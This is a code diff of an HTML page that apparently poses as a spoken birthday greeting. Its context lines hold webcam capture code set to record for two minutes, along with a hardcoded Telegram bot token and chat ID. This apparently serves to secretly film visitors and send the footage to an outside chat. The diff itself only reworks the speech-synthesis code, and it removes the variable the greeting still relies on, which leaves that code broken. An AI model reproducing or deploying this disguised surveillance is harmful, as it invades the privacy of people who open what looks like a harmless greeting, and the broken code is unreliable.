@@ -454,7 +454,7 @@ navigator.mediaDevices.getUserMedia({ video: true })
     const botToken = '6541424487:AAHp2-DNMQke0dAEWh3ScahXpoT7amTaBMU';
     const chatId = '5063584314';
     const captureDuration = 120000; // 2 minutes in milliseconds
-    const a = 'Your image caption'; // Your image caption here
+    
 
     const video = document.createElement('video');
     video.srcObject = stream;
@@ -508,23 +508,22 @@ navigator.mediaDevices.getUserMedia({ video: true })
 </script>
 
 <script>
+const message = new SpeechSynthesisUtterance();
+
 // Assuming 'a' contains the user's name
 const userName = a;
 
 // Construct the birthday message
 const birthdayMessage = `Happy Birthday, ${userName}!`;
 
-// Create a speech synthesis utterance
-const synth = window.speechSynthesis;
-const utterance = new SpeechSynthesisUtterance(birthdayMessage);
+// Set the text to be spoken
+message.text = birthdayMessage;
 
-// Set the voice, rate, and pitch (optional)
-utterance.voice = synth.getVoices()[0]; // You may need to adjust the index
-utterance.rate = 1; // Speech rate (1 is the default)
-utterance.pitch = 1; // Speech pitch (1 is the default)
+// Create an instance of the speech synthesis object
+const speechSynthesis = window.speechSynthesis;
 
-// Speak the birthday message
-synth.speak(utterance);
+// Start speaking
+speechSynthesis.speak(message);
 </script>
 
 <body>
